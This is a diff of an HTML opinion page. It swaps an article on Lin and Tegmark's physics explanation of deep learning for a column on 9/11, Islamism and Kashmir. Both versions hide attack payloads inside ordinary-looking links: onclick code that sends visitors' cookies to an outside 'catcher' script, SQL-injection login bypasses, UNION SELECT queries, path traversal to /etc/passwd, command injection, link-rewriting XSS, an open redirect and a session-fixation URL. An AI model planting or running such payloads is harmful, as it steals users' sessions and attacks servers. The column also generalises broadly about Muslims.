@@ -15,65 +15,32 @@
 
 
 <div class="single">
-<h2>The Extraordinary Link Between Deep Neural Networks and the Nature of the Universe</h2>
+<h2>Fifth column: 9/11 and its aftermath</h2>
 
-<p class="details">By Emerging Technology from the arXiv September 10, 2016 <a href="#"></a> </p>
-<h2 align="right"><a href="20160909-opinion.php"> Previous </a> </h2>
-
+<p class="details">Written by Tavleen Singh |September 11, 2016 1:54 am <a href="#"></a> </p>
+<h2 align="right"><a href="20160910-opinion.php"> Previous </a> </h2>
 
 <p>
+<a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Fifteen years ago </a> today the world changed forever. The boundaries between war and peace disappeared as a cowardly new kind of warfare manifested itself in the 9/11 attacks and a horrible new ideology was born. It is an ideology that continues to haunt us every time there is a new act of jihadi terrorism, and because the rules of war have changed completely, no leader of the ‘civilised’ world has so far been able to come up with an effective strategy to defeat jihadi Islam. It is possible that before very long we will see the <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">  Islamic State destroyed,</a> but the ideology that is the reason why the caliphate was founded continues to have an allure that is disturbingly powerful.
+</p> <p>
+Everywhere that there are Muslims we see the effects of this and everywhere there are Muslims we see excuses for why the allure is so strong. The excuses began immediately after 9/11, with <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> millions of Muslims </a> across the world refusing to accept that it was in the name of Islam that those airplanes were hijacked and used as weapons of mass destruction in New York and Washington.
+</p> <p>
+Ridiculous rumours were given such credence in <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank"> Islamic countries </a> that books were written on the so-called conspiracy behind the 9/11 attacks. Conspiracy theories alleged that there were no Jews killed in New York because Israel was behind the attacks and that the American government was itself responsible, to justify an invasion of Iraq. Rubbish like this is believed by far too many Muslims who see Islam as the target of the global war on terror. The biggest threat to Islam today comes from <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> Islamism, but most world leaders hesitate to say this.</a>
+</p> <p>
+Last week in Vientiane, our Prime Minister blamed Pakistan for a problem that is far more complex than he seems prepared to accept. He said, “There’s one country in our neighbourhood whose competitive advantage rests solely in producing and exporting terrorism. The time has come for us to stop this global exporter of terror.”
+</p> <p>
+If he had the current unrest in the Kashmir Valley in mind when he said this, he must think again. There are many reasons for the unrest, and one of them is that Pakistan continues to infiltrate jihadi terrorists into Kashmir, but we need to acknowledge that <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">  Islamism is nearly as big a factor.</a> The Jamaat-e-Islami began the process of Islamising Kashmir more than 30 years ago, and the process is now complete.
+</p> <p>
+All the louche infidel practices that once existed on account of the beneficial influence of Indic religions have long been erased. Dargahs where  <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  Hindus and Muslims both worshipped have disappeared, </a> as have bars, cinemas and video libraries. As someone who was researching a book on Kashmir when the attacks on these un-Islamic practices began, I witnessed some of these personally. Kashmiri politicians did too, and for fear of losing public sympathy did nothing to stop them, so younger Kashmiri separatists are much more Islamist than those who led the movement for <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">  ‘azadi’ in the Eighties and Nineties.</a>
+</p> <p>
+Our problem with <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">Islamism is sadly not confined to the Kashmir Valley.</a> Indian Muslims in large numbers may not have gone off to fight for ISIS but evidence that they are attracted by the ideology of the caliphate can be found in Muslim-dominated localities across India. How can they not be affected when whole countries like Malaysia and Indonesia have become visibly more Islamist since the<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> 9/11 attacks?</a>
+</p> <p>
+Before the lines between <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank"> war and peace </a> blurred on this day 15 years ago, it was easy to identify the enemy and wage a war to defeat him. It no longer is because the enemy is an ideology and not a country or a group of countries. So whether the leaders of the world admit it or not, what we face today is a war of ideas and ideologies in which defeat and victory are no longer as identifiable or clear as they once used to be. In India, with the <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank">  second largest Muslim population in the world,</a> it becomes even more important that the Islamist version of Islam is defeated. If our political leaders appear not to have come even close to defeating the jihadists, it is because they have tried to define the problem in very simplistic terms.
+</p> <p>
+We have <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">‘secular’ leaders who acknowledge no difference between radical Islam and Hindutva.</a> Against them stand political leaders who believe that the way to win this war is to transform the Sanatan Dharma into a <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> Hindu version of radical Islam.</a> The only possibility of preventing jihadi Islam from putting roots deep into Indian soil is to defend aggressively the religious and secular values that have always defined India. European countries that failed to stand up for their own values today have serious problems with<a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">  jihadi Islam. We must learn from their mistakes.</a>
+</p> 
 
 
-
-</p>
-
-In the last couple of years,<a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> deep learning techniques </a> have transformed the world of artificial intelligence. One by one, the abilities and techniques that humans once imagined were uniquely our own have begun to fall to the onslaught of ever more powerful machines. Deep neural networks are now better than humans at tasks such as face recognition and object recognition. They’ve mastered the ancient game of Go and thrashed the best human players.
-</p> <p>
-But there is a problem. There is no mathematical reason why networks arranged in layers should be so good at these challenges. Mathematicians are flummoxed. Despite the huge success of deep neural networks, <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">  nobody is quite sure how they achieve their success.</a>
-</p> <p>
-Today that changes thanks to the work of Henry Lin at Harvard University and Max Tegmark at MIT. These guys say the reason why mathematicians have been so embarrassed is that the answer depends on the nature of the universe. In other words, the answer lies in the regime of physics rather than mathematics.
-</p> <p>
-First, let’s set up the problem using the example of classifying a <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">megabit grayscale image </a> to determine whether it shows a cat or a dog.
-</p> <p>
-Such an image consists of a million pixels that can each take one of 256 grayscale values. So in theory, there can be 2561000000 possible images, and for each one it is necessary to compute whether it shows a cat or dog. And yet neural networks, with merely <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">   thousands or millions of parameters,</a> somehow manage this classification task with ease.
-</p> <p>
-In the language of mathematics, neural networks work by approximating complex mathematical functions with simpler ones. When it comes to classifying images of cats and dogs, the neural network must implement a function that takes as an input a million grayscale pixels and outputs the probability distribution of what it might represent.
-</p> <p>
-The problem is that there are orders of magnitude more mathematical functions than possible networks to approximate them. And yet  <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> deep neural networks somehow get the right answer.</a>
-</p> <p>
-Now Lin and Tegmark say they’ve worked out why. The answer is that the universe is governed by a tiny subset of all possible functions. In other words, when the laws of physics are written down mathematically, they can all be described by functions that have a remarkable set of simple properties.
-</p> <p>
-So deep neural networks don’t have to approximate any possible mathematical function, only a tiny subset of them.
-</p> <p>
-To put this in perspective, consider the order of a polynomial function, which is the size of its highest exponent. So a quadratic equation like y=x^2 has order 2, the equation y=x^24 has order 24, and so on.
-</p> <p>
-Obviously, the number of orders is infinite and yet only a tiny subset of polynomials appear in the laws of physics. “For reasons that are still not fully understood, our universe can be accurately described by polynomial Hamiltonians of low order,” say Lin and Tegmark. Typically, the polynomials that describe <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">  laws of physics have orders ranging from 2 to 4.</a>
-</p> <p>
-The laws of physics have other important properties. For example, they are usually <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  symmetrical when it comes to rotation and translation. </a> Rotate a cat or dog through 360 degrees and it looks the same; translate it by 10 meters or 100 meters or a kilometer and it will look the same. That also simplifies the task of approximating the process of cat or dog recognition.
-</p> <p>
-These properties mean that neural networks do not need to approximate an infinitude of possible mathematical functions </a> but only a tiny subset of the simplest ones.
-</p> <p>
-There is another property of the universe that neural networks exploit. This is the hierarchy of its structure. <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank"> “Elementary particles form atoms </a> which in turn form molecules, cells, organisms, planets, solar systems, galaxies, etc.,” say Lin and Tegmark. And complex structures are often formed through a sequence of simpler steps.
-</p> <p>
-This is why the structure of neural networks is important too: the layers in these networks can approximate each step in the causal sequence.
-
-</p> <p>
-
-Lin and Tegmark give the example of the <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">cosmic microwave background radiation, </a> the echo of the Big Bang that permeates the universe. In recent years, various spacecraft have mapped this radiation in ever higher resolution. And of course, physicists have puzzled over why these maps take the form they do.
-</p> <p>
-Tegmark and Lin point out that whatever the reason, it is undoubtedly the result of a causal hierarchy. “A set of cosmological parameters (the density of dark matter, etc.) determines the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> power spectrum of density fluctuations </a> in our universe, which in turn determines the pattern of cosmic microwave background radiation reaching us from our early universe, which gets combined with foreground radio noise from our galaxy to produce the frequency-dependent sky maps that are recorded by a satellite-based telescope,” they say.
-</p> <p>
-Each of these causal layers contains progressively more data. There are only a handful of cosmological parameters but the maps and the noise they contain are made up of billions of numbers. The goal of physics is to analyze the big numbers in a way that reveals the smaller ones.
-</p> <p>
-And when phenomena have this hierarchical structure, neural networks make the<a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">  process of analyzing it significantly easier.</a>
-</p> <p>
-“We have shown that the success of deep and cheap learning depends not only on mathematics but also on physics, which favors certain classes of exceptionally simple probability distributions that deep learning is <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank"> uniquely suited to model,”</a> conclude Lin and Tegmark.
-</p> <p>
-That’s interesting and important work with significant implications.<a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> Artificial neural networks </a> are famously based on biological ones. So not only do Lin and Tegmark’s ideas explain why deep learning machines work so well, they also explain why human brains can make sense of the universe. Evolution has somehow settled on a brain structure that is ideally suited to teasing apart the complexity of the universe.
-</p> <p>
-This work opens the way for significant progress in <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> artificial intelligence.</a> Now that we finally understand why deep neural networks work so well, mathematicians can get to work exploring the specific mathematical properties that allow them to perform so well. “Strengthening the analytic understanding of deep learning may suggest ways of <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> improving it,”</a> say Lin and Tegmark.
-</p> <p>
-Deep learning has taken giant strides in recent years. With this improved understanding, the rate of advancement is bound to accelerate.
 
 <p>
 </div>
